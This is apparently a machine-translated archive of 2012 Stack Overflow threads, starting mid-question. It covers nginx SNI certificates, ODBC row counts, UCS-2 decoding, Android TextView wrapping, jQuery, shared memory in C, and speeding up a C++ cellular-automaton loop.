  server_name oldsite.ca;

  rewrite ^(.*) https://newsite.com$1 permanent;
}

server {
  listen   443;

  ssl on;
  ssl_certificate /etc/ssl/certs/newsite.com.pem;
  ssl_certificate_key /etc/ssl/private/newsite.com.ca.key;

  server_name newsite.com

  ...
} 
```

出于某种原因，IE（尝试使用 IE9）只看到配置的第一个证书，所以如果我转到[https://newsite.com](https://newsite.com)，我会收到带有 oldsite.com 证书的证书无效消息。如果我更改服务器块的顺序，[https:](https://newsite.com) //newsite.com 工作正常，但重定向（重写）没有（现在它只看到 newsite.com 证书，所以它当然抱怨它在点击时无效oldsite.com）。

任何想法，为什么（除了只是 IE）它看不到各自域的两个证书？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T16:23:03.860

You're visibly trying to use [Server Name Indication](http://nginx.org/en/docs/http/configuring_https_servers.html#sni), to be able to use multiple certificates on the same IP address/port combination. You should check that your version of nginx supports it (as described in the documentation).

This should be supported by IE 9 on Windows Vista and 7, but it's not supported on any version of IE on XP.

# oracle - 为什么 unixODBC SQLTables 总是返回 4294967295 的 SQLRowCount？

> ID：11583252
> 
> 赞同：0
> 
> 时间：2012-07-20T16:18:50.163
> 
> 标签：oracle, odbc, unixodbc

使用以下代码，我总是在 Oracle 数据库中获得该值

```
SQLHSTMT hStmt = SQL_NULL_HANDLE;
SQLRETURN sret;
SQLLEN rowCount = 0;

const SQLHDBC conn = this->getConnection();
if (conn == NULL)
{
    ret = false;
}

SQLAllocHandle(SQL_HANDLE_STMT, conn, &hStmt);
std::string metaTableName="meta_table";

sret=SQLTables( hStmt,
           NULL, 0, /* no specific catalog */
           NULL, 0, /* no specific schema */
           (SQLCHAR *)metaTableName.c_str(), SQL_NTS,
           NULL, 0); /* no specific type - table or view */

if ((sret != SQL_SUCCESS) && (sret != SQL_SUCCESS_WITH_INFO))
{
    std::cout << "Problem retrieving " << metaTableName << " table from database!" << std::endl);
    ret= false;
}

SQLRowCount(hStmt,&rowCount);
std::cout <<std::endl << "Rows: " <<rowCount<<std::endl ; 
```

没有错误消息，因此没有明显的原因导致此行为

使用 oracle 库：oracle-instantclient11.2-odbc-11.2.0.1.0-1.x86_64

关于这种行为的原因有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T20:29:08.603

数字 4294967295 是 2 ^(32) -1。换句话说，它是 32 位整数的 -1 的二进制补码。无论哪种方式，在二进制中，这意味着每个位都设置为“1”。在某处，它试图用无符号整数解释有符号值 -1。

它试图用 -1 回复以表明它无法描述行数。然而，有一个数据表示问题给你一个奇怪的值。我怀疑这是驱动程序问题，或者可能是由于 32 位到 64 位异常。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-23T07:59:27.177

SQLRowCount 返回受 UPDATE、INSERT 或 DELETE 语句影响的行数；SQLBulkOperations 中的 SQL_ADD、SQL_UPDATE_BY_BOOKMARK 或 SQL_DELETE_BY_BOOKMARK 操作；或者 SQLSetPos 中的 SQL_UPDATE 或 SQL_DELETE 操作 - 当您不执行任何这些操作时返回的值可以被忽略。

有关 SQLRowCount 的更多信息，请参阅 [Micrsoft ODBC 文档](http://msdn.microsoft.com/en-us/library/windows/desktop/ms711835%28v=vs.85%29.aspx)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-23T08:52:50.707

亚当霍克斯给了你一个线索。我强烈怀疑，您使用的 ODBC 驱动程序是用 32 位 SQLULEN 构建的，但您的代码和 unixODBC 是用 64 位 SQLULEN 构建的。获取另一个版本的驱动程序或使用 32 位 SQLLEN/SQLULEN 重新构建 unixODBC，然后重新构建您的应用程序。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-11-24T19:47:46.160

我在另一种情况下遇到了同样的问题。这是由于：

1.  字节顺序和
2.  存储大小。

您使用的存储大小和顺序比实际需要的少且不兼容。发生在 32/64 位 int/float 大小差异和 unix-posix 字节排序差异中。

根据我的经验，我一直在 32 位 CentOS 服务器上收到函数调用结果`int(-4294967295)`（*注意负号，即字节排序*），而在我的 64 位 Windows 本地环境中，我一直在接收函数的正确结果。将大小的类型指示符更改为更大的 64 位兼容（在 PHP 中从`SQLT_INT`to `SQLT_LNG`）解决了 32 位 unix 服务器上的问题，同时在 64 位 posix 本地环境中保持了正确的结果。

[我的经验](https://stackoverflow.com/questions/27089110/ora-01036-illegal-variable-name-number-while-calling-stored-function/27090320#27090320)

# c# - 如何将 unicode UCS-2 格式的文本转换为 C# 可读？

> ID：11583256
> 
> 赞同：3
> 
> 时间：2012-07-20T16:19:00.310
> 
> 标签：c#, unicode, ucs2

我在 SIM900 GPRS 的 SMS 中收到此消息。

> 07916698019021F00410D05479BDDC7CBBCB790008217002123430826A0049006E0063006F00720072006500630074002000700061007300730077006F00720064002E00200050006C050610306500065060740507202079060750702007001070730700F0700402001060010600E02

另一个示例消息：

> 07916698019021F00410D05479BDDC7CBBCB790008217002025501826A0049006E0063006F00720072006500630074002000700061007300730077006F00720064002E00200050006C06001073050200506E04065070200906F07072020700607307007060020600006007060090600E

我认为这条消息是 Unicode UCS-2 格式并且是泰语。但是我无法将其转换为可读的东西。我发现这个非常有用的代码：

```
//Here's how you'd go from a string to stuff like
// U+0053 U+0063 U+006f
string scott = "ฉ";
foreach (char s in scott) {
  Console.Write("{0:x4} ", (int)s);
}
//Here's how converted a string (assuming it starts with U+)
// containing the representation of a char
// back to a char
// Is there a built in, or cleaner way? Would this work in Chinese?
string maybeC = "U+0063";
int p = int.Parse(maybeC.Substring(2),
 System.Globalization.NumberStyles.HexNumber);
Console.WriteLine((char)p); 
```

提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-20T16:44:15.427

在 Wikipedia 上阅读我发现这篇[文章](http://en.wikipedia.org/wiki/UTF-16/UCS-2)，说 UCS-2 与 UTF-16 非常相似。所以：

```
string s = "07916698019021F00410D05479BDDC7CBBCB790008217002025501826A0049006E0063006F00720072006500630074002000700061007300730077006F00720064002E00200050006C06001073050200506E04065070200906F07072020700607307007060020600006007060090600E";
List<byte> bytes = new List<byte>();
for (int i = 0; i < s.Length; i+=2)
{
    bytes.Add(byte.Parse(s.Substring(i, 2), NumberStyles.HexNumber));
}

var str = Encoding.Unicode.GetString(bytes.ToArray()); 
```

输出：`鄇顦送င哐뵹糜쮻y℈ɰ唂舁jIncorrect password. P٬ကճ湐؄灐ठ牰܂怀ݳ瀀ɠ怀؇退`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T16:26:03.297

尝试使用内置`System.Text.Encoding`类。

```
using System.Text;
// ..
var bytes = Encoding.GetEncoding("ucs-2").GetBytes("SomeString"); 
```

编辑：您可以从 UCS-2/UTF-16 编码转换为`GetString(byte)`.

# android - TextView 不会破坏文本

> ID：11583261
> 
> 赞同：2
> 
> 时间：2012-07-20T16:19:22.533
> 
> 标签：android, textview, android-4.0-ice-cream-sandwich, line-breaks, android-2.3-gingerbread

我在 ICS 之前遇到 textView 不换行的问题。在 ICS 中（我相信蜂窝也可以，但我还没有尝试过），textView 中的文本很好地中断，但在姜饼中，下面的文本一直在一行中。任何想法如何解决这一问题？

我正在使用 viewpager，这是每个屏幕的布局。我使用自定义 textView 只是为了添加自定义字体，希望这不是问题。

pager_item.xml：`

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:gravity="center"
    android:orientation="vertical"
    android:padding="20dp" >

    <com.ursus.absolution.startme.MyTextView
        android:id="@+id/message_textview"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:background="@drawable/quotes_background"
        android:gravity="center"
        android:textColor="#585858"
        android:textSize="25dp" />

    <com.ursus.absolution.startme.MyTextView
        android:id="@+id/author_textview"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:gravity="center"
        android:textColor="#585858"
        android:textSize="20dp" />

</LinearLayout>`

In ICS
_____________
|           |
|           |
| "This is  |
|  my cool  |
|   text"   |
|           |
|___________|

In gingerbread and below
_____________
|           |
|           |
| "This is my cool text"
|           |
|           |
|           |
|___________| 
```

对不起，我是新人，我不能发布图片。在此先感谢，希望你们得到它。

***///////更新///////////////***

好的，伙计们，这很有趣..我尝试了你所有的建议，但都没有奏效，所以我开始了一个新的空白项目，只是将一个 textview 放入布局中，字符串很长，它包裹得很好。

所以，我不知道这怎么可能，但它是自定义主题来设置动作栏的样式，当我在清单中注释掉它时它工作得很好，**但是系统全息主题似乎也在这样做**

AndroidManifest.xml

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.ursus.absolution.startme"
android:versionCode="1"
android:versionName="1.0" >

<uses-sdk
    android:minSdkVersion="8"
    android:targetSdkVersion="15" />

<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.WRITE_INTERNAL_STORAGE" />

<application
    android:icon="@drawable/iconn"
    android:label="@string/app_name"
    android:theme="@style/Theme.myStyle" >
    <activity
        android:name=".MainActivity"
        android:label="@string/title_activity_main" >
    </activity>
    <activity
        android:name=".SplashScreenActivity"
        android:label="@string/title_activity_main"
        android:theme="@android:style/Theme.NoTitleBar.Fullscreen" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
</application> 
```

样式.xml

```
<resources>

<style name="Theme.myStyle" parent="@android:style/Theme.Holo">
    <item name="android:actionBarStyle">@style/mycoolstyle_transparent_ActionBar</item>
</style>

<style name="mycoolstyle_transparent_ActionBar" parent="@android:style/Widget.Holo.ActionBar">
    <item name="android:background">@drawable/transparent_actionbar</item>
</style> 
```

...所以当我在清单中添加 android:theme="@style/Theme.myStyle" 时，textviews 行为异常*但是当我添加 android:theme="@android:style/Theme.Holo" 时，就像我通常会做的那样强制全息主题，它也表现不佳*

奇怪的。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-23T13:52:06.140

此问题以各种形式报告，例如[此处](https://stackoverflow.com/questions/8922671/android-textviews-stopped-wrapping-text)和[此处。](https://stackoverflow.com/questions/11136145/android-textview-text-not-wrapping-within-relativelayout-on-version-2-3-3)许多问题报告了以前的工作布局**在更新到 ICS/holo 主题时**会被破坏。

我能够轻松地复制它，这是一行 xml 的问题：`@android:style/Theme.Holo`

解决这个问题的最简单方法是**引入一个版本化的 values 文件夹**，让 Android 选择正确的文件夹。换句话说，您将拥有 2 个styles.xml：

*   在`values-v11`文件夹中，您应该放置您指定的文件夹（使用`parent="@android:style/Theme.Holo"`）
*   在旧`values`文件夹中，您将放置“普通”文件夹，带有`parent="android:Theme.Black.NoTitleBar"`.

您的清单应保持不变，Android 将根据其版本选择正确的 xml。解决方案可能不是最优雅的，但至少你不会乱用 android:maxlines、android:width 等

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-25T14:02:05.413

除了 Shine 答案，我还必须为 TextView 设置相应的参数：

```
 android:ellipsize="none"
                android:maxLines="20"
                android:scrollHorizontally="false"
                android:singleLine="false" 
```

例子：

```
 <TextView                  
                android:textColor="@color/white"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:ellipsize="none"
                android:maxLines="20"
                android:scrollHorizontally="false"
                android:singleLine="false"
                android:text="@string/my_text" /> 
```

# ajax - 如何使用 jquery 加载方法将文件的内容加载到变量中？

> ID：11583271
> 
> 赞同：31
> 
> 时间：2012-07-20T16:19:55.903
> 
> 标签：ajax, jquery

如何使用 jQuery`.load()`方法将文件的内容加载到变量而不是 DOM 中？

例如，

```
$("#logList").load("logFile", function(response){ }); 
```

我不想将文件加载到`#logList`DOM 的元素中，而是将其加载到变量中。

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2012-07-20T16:23:32.080

`load()`只是`$.get`自动将内容插入到 DOM 元素中的快捷方式，所以这样做：

```
$.get("logFile", function(response) {
     var logfile = response;
}); 
```

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2012-07-20T16:23:28.790

您可以使用它[`$.get()`](http://api.jquery.com/jQuery.get/)来发起一个 GET 请求。在成功回调中，您可以将结果设置为您的变量：

```
var stuff;
$.get('logFile', function (response) {
    stuff = response;
}); 
```

请注意，这是一个**异步操作**。操作完成后回调函数会运行，所以后面的命令`$.get(...)`会提前执行。

这就是为什么以下将记录`undefined`：

```
var stuff;
$.get('logFile', function (var) {
    stuff = var;
});
console.log(stuff); //undefined 
```

# java - JPA 如何确定哪个类正在调用方法？

> ID：11583272
> 
> 赞同：0
> 
> 时间：2012-07-20T16:20:04.060
> 
> 标签：java, jpa, playframework

我正在研究一个将被许多不同类子分类的类。有一些静态方法需要知道调用源自的子类的名称。现在我知道我可以在静态方法中做这样的事情

```
foo(Class clazz, String things, String... stuff){} 
```

但我更愿意让用户更轻松，而不必拨打电话，例如

```
Pass.retract(Pass.class, xxxx, yyyy); 
```

相反，我希望它看起来像

```
Pass.retract(xxxx, yyyy); 
```

现在，我知道 JPA 使用它的 find() 函数来做到这一点。我已经多次遍历搜索功能，但似乎实体变量被神奇地填充了。它是如何做到的？如果有任何大师有一个想法，我会非常感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T17:06:10.767

Play 1.x 做了很多神奇的事情，包括使用[Javassist](http://www.jboss.org/javassist/)的 find 方法。它是一个运行时字节码增强器，可以通过做一些“魔术”来向用户隐藏 API 的复杂性。

也就是说，Play2 选择放弃这种方法，因为核心开发人员认为当人们试图维护核心代码库时，这种魔法太难理解了。

# c++ - 我怎样才能解决这个问题？

> ID：11583273
> 
> 赞同：0
> 
> 时间：2012-07-20T16:20:07.860
> 
> 标签：c++, floating-point, divide-by-zero

```
using namespace std;

//a class that will handle all the calculations requested by user

class MathOperations{
  public:
    void Message();
    int setSum(int,int);
    int setSuB(int,int);
    int setMul(int,int);
    float setDiv(float,float *);
    int setSqrt(int);
};

//Implementation:

void MathOperations:: Message(){
    cout<< " Welcome. This program simulates a calculator "<<endl;
}
// implementing the setters methods.
int MathOperations::setSum(int a, int b){

    int total;
    total = a + b;
    return total;
} 
int MathOperations:: setSuB(int a, int b){
    int total;
    total = a - b;
    return total;
}
int MathOperations:: setMul(int a, int b){
    int total;
    total = a * b;
    return total;
}

float MathOperations:: setDiv(float a, float *b){
    float result;
    if(b ==0){
        cout << "Using the Default Value of 1 because you can't devide by 0"<<endl;
    }
    else
        result = (a / *b);
    return result;
}

int MathOperations::setSqrt(int Square){
    int total;
    total = sqrt(Square);
    return total;
}

int main(int argc, const char * argv[])
{
    //creating instances of class MathOperations
    MathOperations add, sub, mul, div, sqrt;
    ///creating variable to hold user input

    int fnum;
    float snum;
    char opt= '0';

    //propt user for values
    cout << " Enter a Number"<<endl;
    cin >> fnum;

    cout << " Enter a second number " <<endl;
    cin >> snum;

    float total = div.setDiv(fnum, &snum);

    cout << total <<endl;

    cout << " What would you like to do '+','-','*','/' ?"<<endl;
    cin >> opt;

    switch (opt) {
      case '+' :
        {
            int total = add.setSum(fnum, snum);
            cout << " The Total Sum of both numbers is " << total <<endl;
        }
        break;
      case '-' :
        {
            int total = sub.setSuB(fnum, snum);
            cout << " The Subtraction of both Numbers is " << total << endl;
        }
        break;
      case '*' :
        {
            int total = mul.setMul(fnum, snum);
            cout << " The Multiplication of both Numbers is " << total << endl;
        }
        break;
      case '/' :
        {
            int total = div.setDiv(fnum, &snum);
            cout << " The Division of both Numbers is " << total <<endl;
        }
      default:
        cout << " Not a valid Option"<<endl;
    }

} 
```

该部门工作不正常。我在这里做错了什么？我正在尝试创建一个包含数学运算的类。我是一个初学者，想在这里做一些练习。你能具体告诉我我做错了什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T16:24:19.687

The second parameter of the function div should not be a pointer. At least I don't see any reason for it being a pointer.

So just remove the * and & from the variable snum.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T16:30:06.167

您没有在 setDiv 函数中保护自己免于被 0 除，因为您没有首先将第二个浮点数与 0 进行比较。您只是将其地址与 NULL 进行比较。

并且错误消息没有意义：程序不会以任何方式“使用 1”。

如果指针恰好为 NULL，那么您将返回一个未初始化的值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T16:31:01.940

当您说您使用 1 而不是 0 时，您永远不会将 b 的值更改为 1。

# java - 堆增长和下降

> ID：11583274
> 
> 赞同：2
> 
> 时间：2012-07-20T16:20:10.807
> 
> 标签：java, memory, garbage-collection, jconsole

为什么我的服务器的堆使用量稳定增长到某个点，然后在一定量的堆使用量（~270mb）时下降。我认为下降是由于垃圾收集。但是为什么我的服务器什么也没做，它却在增长？

![在此处输入图像描述](../Images/c7332132558fc1f967f75296c72652fa.png)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-20T16:24:31.910

它已经`jconsole`连接到它。这会产生一些垃圾来向您发送有关使用了多少内存的数据。

如果您改用 jvisualvm，它还会向您显示正在创建的对象。我怀疑它使用更多垃圾来监视您的应用程序，而 jvisuavm 可能是报告的最大内存用户。;)

# java-me - 从服务器下载图像时如何设置进度条/进程指示器

> ID：11583278
> 
> 赞同：-2
> 
> 时间：2012-07-20T16:20:15.840
> 
> 标签：java-me

我正在从服务器下载我的**j2me应用程序中的图像。**

我希望在下载未完成之前显示进度条或活动指示器。

但我不知道该怎么做？我搜索了一下，但没有得到答案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-21T02:39:53.973

您需要使用 Gauge Control 来满足您的要求。使用 Gauge Control 创建一个简单的 for 并在开始下载代码之前显示该表单。

```
// first display progressbar form
ProgressForm progressForm = new ProgressForm ( "Please wait" ); 
display.setCurrent(progressForm); 

// now downloading code in background
new Thread ( new Runnable() 
{
      public void run()
      {
          // Image downloading code goes here
      }
}).start(); 
```

# c - 两个进程共享内存

> ID：11583281
> 
> 赞同：3
> 
> 时间：2012-07-20T16:20:28.657
> 
> 标签：c, linux

我想在两个进程之间共享内存。我知道的一种方法是`mmap`共享文件。但是，我不想使用共享文件，我想要内存中的匿名映射。我怎样才能做到这一点。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T16:21:58.933

共享内存就是你想要的：[http ://en.wikipedia.org/wiki/Shared_memory](http://en.wikipedia.org/wiki/Shared_memory)

因为你在 linux 上，所以你去：[http ://www.kernel.org/doc/man-pages/online/pages/man7/shm_overview.7.html](http://www.kernel.org/doc/man-pages/online/pages/man7/shm_overview.7.html)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-20T16:25:36.520

[shm_open](http://www.kernel.org/doc/man-pages/online/pages/man3/shm_unlink.3.html)是你的朋友。您可以使用[shm_unlink](http://linux.die.net/man/3/shm_unlink)取消映射共享区域。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-20T16:24:22.847

您可以将 mmap 文件放在目录 /dev/shm 中，该目录在大多数 Linux 系统中作为 tmpfs（即基于内存的文件系统）安装。

或者您可以在目录树的其他位置安装您自己的 tmpfs（如果您需要其他选项）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-20T16:26:39.563

[shm_get](http://linux.die.net/man/2/shmget)是一个很好的起点，但您还需要阅读有关[信号量](http://linux.die.net/man/2/semget)的信息以实现互斥，以免内存损坏。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-20T16:43:11.243

请记住，在 NUMA 系统上，如果内核位于不同的节点上，它们将以不同的速度访问内存，除非您选择与内核等距的 NUMA 节点。

# c++ - 针对大量迭代优化代码

> ID：11583292
> 
> 赞同：2
> 
> 时间：2012-07-20T16:21:09.030
> 
> 标签：c++, optimization

我目前正在从事一个涉及大量迭代的项目（准确地说是 2^32）。在我的大部分计算中，我主要使用mathematica，但它无法处理那种数量的过程。有人建议我c++可以处理它，所以昨晚我学习了c++并编写了以下代码：

```
//old code 
```

代码运行良好，（我检查了较小的参数）但我已经开始运行它 4294967295 = 2^32-1 步骤，我认为这需要数百个小时。如果有人能告诉我是否有办法优化此代码的某些部分以使其运行得更快，我将不胜感激？我对这种语言没有经验，所以我如何构造函数可能看起来很混乱。我认为我的 Ca2step 函数运行得非常有效（我可能错了），而且我认为我在主要部分中的循环正在减慢一切。我认为必须有更快的方法来完成我想要完成的工作，所以任何帮助都会很棒。谢谢，理查德。

======= 更新 ========

非常感谢大家，我真的很感激。好的，这对我来说都是新事物，所以我发现很难理解某些事情的含义。下面是我更新的代码。但是我觉得它仍然很慢。有些人建议“并行化”，但我不知道这是什么以及我会怎么做？再次感谢，理查德。

```
#include <iostream>
#include <vector>
#include <algorithm>
using namespace std;

//parameters
int a[32] = {0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0,
             1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1};
int b[32] = {1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 
             1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1};
// Create vector of vectors from arrays to be input into function.
vector<int> va (a, a + sizeof(a) / sizeof(int) );
vector<int> vb (b, b + sizeof(b) / sizeof(int) );

vector< vector<int> > ca2step (long int r, vector< vector<int> > vec)
{
    int rulearray[32] = { 0 };
    for (int pos = 31; pos >= 0; --pos){
        if (r % 2) 
            rulearray[pos] = 1;
        r /= 2;
    }
    int arraya[32] = {0};
    int arrayb[32] = {0};
    for (int i = 0; i < 32; i++) {
        arraya[i] = vec[0][i];
        arrayb[i] = vec[1][i];
    }

    vector< vector<int> > output;
    typedef int t_array[32];
    t_array vll, vl, vr, vrr, vx;

    rotate_copy(arrayb,arrayb+2,arrayb+32,vll);
    rotate_copy(arrayb,arrayb+1,arrayb+32,vl);    
    rotate_copy(arrayb,arrayb+31,arrayb+32,vr);    
    rotate_copy(arrayb,arrayb+30,arrayb+32,vrr);

    for (int i = 0; i < 32; i++) {
        vx[i] = (arraya[i] + rulearray[(31 - (vll[i] + (2 * vl[i]) 
                                           + (4 * arrayb[i]) + (8 * vr[i]) + (16 * vrr[i])))]) % 2;
    }

    output.push_back(vector<int>(arrayb, arrayb+32));
    output.push_back(vector<int>(vx, vx+32));

    return (output);

}

int caevolve ( long int r, vector< vector<int> > vector ){
    int count;
    for(int j=0; j<20; j++){ 
        //run function
        vector = ca2step(r, vector);
    }
    if (vector[0] == va || vector[1] == va) {
        count = 1;
        }
    else{
        count=0;
    }
    return (count);
}

int main ()
{
    vector< vector<int> > vinput;
    vinput.reserve(32);
    vinput.push_back(va);
    vinput.push_back(vb); 
    int counter = 0;

    for(unsigned long long int i=0;i<4294967295;i++){  //4294967295
        counter += caevolve(i, vinput);
        }

    cout<< "Counter : " << counter << endl;

    return 0;

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T16:38:37.213

除了 C++ 性能之外，您还应该考虑并行化代码并利用多核架构。在我看来，你的问题是一个典型的例子。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T16:44:01.413

仪器/配置文件并运行您的代码进行十万或一百万次迭代。确定花费大量执行时间的代码部分。尝试并提高这些部分的性能。重复。只有当你对自己无法再进步感到满意时，你才应该尝试运行它超过四*十亿*次。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-20T16:51:42.597

数组访问太多。您需要一个预取或更多局部变量来表示这些重新取回的数组元素。缓存友好。在这里阅读

[http://www.research.scea.com/research/pdfs/GDC2003_Memory_Optimization_18Mar03.pdf](http://www.research.scea.com/research/pdfs/GDC2003_Memory_Optimization_18Mar03.pdf)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-20T17:10:03.243

将所有向量移到`ca2step`函数之外；使它们甚至是**全局**变量。`vector::reserve()`在开始使用它们之前使用扩展它们的尺寸`push_back()`，你知道所有的尺寸。由于`ca2step`现在将在它外部的数组上工作，它不需要返回任何东西，所以不需要两个向量的向量；直接使用这两个向量，当你完成后，就用`vector::clear()`它们。

此外，您可能需要将循环变量类型更改为`unsigned long`or `unsigned long long`。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-20T16:29:21.857

Jack 已经正确地确定了向量内的内存分配可能是一个巨大的成本。因此，将向量移到循环之外，并简单地使用`clear()`它们而不是创建全新的向量。

这将在每次迭代中为每个向量节省至少一次分配/解除分配。

不要按值传递向量，而是`const vector<vector<int>>&`用作`ca2step`. 这将为内部循环的每次迭代节省一大堆向量副本（以及内存分配和释放），这是一大堆。

在内部`ca2step`，使用堆栈数组（也许`std::array`）而不是向量。这可以节省更多的动态内存分配。 `begin(arrayb)`将适用于数组和向量（而不是`arrayb.begin()`）。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-07-20T22:13:33.140

这在某种程度上应该由编译器完成。在您的情况下，您应该尝试并行化您的代码。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-07-20T16:26:04.217

You could use a LinkedList instead of a vector. LinkedLists have faster insertion (push_back for vectors) since they never need to resize themselves, which, at large numbers, can be a costly operation.

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-04-03T03:47:12.673

我通过了这个线程并查看了问题。但已经有一段时间了。无论如何，我已经尝试使用一些位运算符和 openmp。

我的假设： 1\. 处理二进制数 2\. 所有 32 位

我已将所有数组替换为单个 int，因为您的 32 宽数组仅包含 '0' 和 '1' 正好适合一个 int（4 字节）。这样做可以帮助您消除一些循环并节省内存访问。

更新* 学习了一些新技巧，更新了一些最小的汇编代码

```
#include <iostream>
using namespace std;

#define MASK 0x1F  /*last 5 bits*/

unsigned int toInt(int a[32]){
    int result = 0;
    for(int i = 0; i<32;i++)  
    if(a[i]==1) result |= 1 << (31-i);
    return result;
}

inline unsigned int ror(unsigned int v,unsigned int sh){
//rotate v to the right by sh
    asm("ror %1,%0;" :"=r"(v) : "cI"(sh), "0"(v) );
    return v;
}

unsigned int compute(unsigned int rule, unsigned int target){
    unsigned int t = rol(target,3);
    unsigned int d = 0;
    unsigned int k;
    for(int i=0;i<32;i++){
        k  = ( t & MASK );
        d |= ( (rule>>k) & 1 ) << (31-i) ;
        t  =  rol(t,1);      
    }
    return d;
}

int ca2step (unsigned int rule, unsigned int a, unsigned int b ){
    unsigned int xx = a;
    unsigned int yy = b;

    int tmp;
    unsigned int d,tmpyy;

    for (int j=0; j<19;j++){
        d = compute(rule,yy); 
        tmpyy = xx ^ d ;
        xx = yy;
        yy = tmpyy;
    }
    return ( yy == a || yy == b ) ;  
}    

int main (){

    int a[32] = {0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 
                 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1};
    int b[32] = {1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1,
                 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1};
    int counter = 0;
    unsigned int aa = toInt(a);
    unsigned int bb = toInt(b);

    #pragma omp parallel for reduction(+:counter)
    for(unsigned int i=0;i < 0xffffffff ;i++){
        counter += ca2step(i, aa, bb);
    }

    cout << counter <<"\n";

    return 0;
} 
```

编译：

```
g++ filename.cpp -O3 -fopenmp 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-07-22T14:42:34.510

感谢所有帮助，我终于在合理的时间内（大约 11 小时）完成了这项工作。只是想我会分享我的代码。在接下来的几周内，我将需要运行几次，所以如果有任何其他技巧可以用来进一步缩短时间，我们将不胜感激！

```
 #include <iostream>
using namespace std;

bool is_equal ( int a[], int b[]){
    for (int i=0; i<32; i++ ){
        if ( a[i] != b[i] )
            return false;
    }
    return true;
}

int ca2step (long long int rule, int arraya[32], int arrayb[32] ){
    int count =0;
    int x[32];
    int y[32];
    for(int i=0;i<32;i++){
        x[i] = arraya[i];
        y[i] = arrayb[i];
    }

    for (int j=0; j<19;j++){
            int arrayc[32];
            for (int i=0; i<32; i++){
            arrayc[i] = (x[i] + ((rule >> ( y[(i+2)%32] + (2 * y[(i+1)%32]) + 
                   (4 * y[i]) + (8 * y[(i+31)%32]) + (16 * y[(i+30)%32])) )& 1))%2;
            }

            for(int k=0;k<32;k++){ 
                x[k] = y[k];
                y[k] = arrayc[k];}
    }

    if(is_equal(y, arraya) || is_equal(y, arrayb)){
        count++;}  
    return(count);     
}

int main (){
    int a[32] = {0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 
                 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1};
    int b[32] = {1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1,
                 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1};
    int counter = 0;
    for(long long int i=0;i<10000000;i++){  //4294967295
        counter += ca2step(i, a, b);
        }

    cout << counter ;
    return 0;
} 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2012-07-20T16:35:41.183

我认为你可以摆脱初始循环来填充规则数组，替换为 r: 上的位测试来测试第 n 位，你可以使用

```
(r & (1 << nth)) ? 1 : 0 ... 
```

那么 rulearray 的使用可以被替换为

```
arraya[i] + (r & (1 << (31 - (vll[i] + (2 * vl[i]) + (4 * arrayb[i]) + (8 * vr[i]) + (16 * vrr[i])) ?  1 : 0) 
```

rotate_copy 可以与普通的旧数组一起使用：并且您可以使用它来避免大量动态内存分配，因为所有大小都是固定的。使用 typedef 强制执行此操作：

```
 typedef int t_array[32];
 t_array arraya, arrayb, vll, vl, vr, vrr, vx;

 rotate_copy(arrayb,arrayb+2,arrayb+32,vll);
 rotate_copy(arrayb,arrayb+1,arrayb+32,vl);    
 rotate_copy(arrayb,arrayb+31,arrayb+32,vr);    
